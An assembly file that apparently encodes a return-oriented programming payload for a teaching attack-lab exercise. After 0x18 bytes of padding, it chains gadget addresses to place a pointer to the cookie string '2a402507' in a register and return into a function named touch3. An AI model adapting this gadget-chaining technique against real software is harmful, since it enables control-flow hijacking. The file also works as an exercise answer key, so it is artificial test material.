.globl rsp

rsp:
    .org rsp + 0x18, 0x23

rbp:
    .quad 0x401ad0      /* movq %rsp, %rax */
rdi:
    .quad 0x401a46      /* movq %rax, %rdi */
    .quad 0x401a40      /* popq %rax */
    .quad data - rdi    /* offset */
    .quad 0x401b04      /* movl %eax, %edx */
    .quad 0x401a8d      /* movl %edx, %ecx */
    .quad 0x401ac2      /* movl %ecx, %esi */
    .quad 0x401a79      /* jmpq <add_xy>  */
    .quad 0x401a46      /* movq %rax, %rdi */
    .quad 0x4019a0      /* touch3 */

data:
    .asciz "2a402507"

tail:
    .byte 0xa
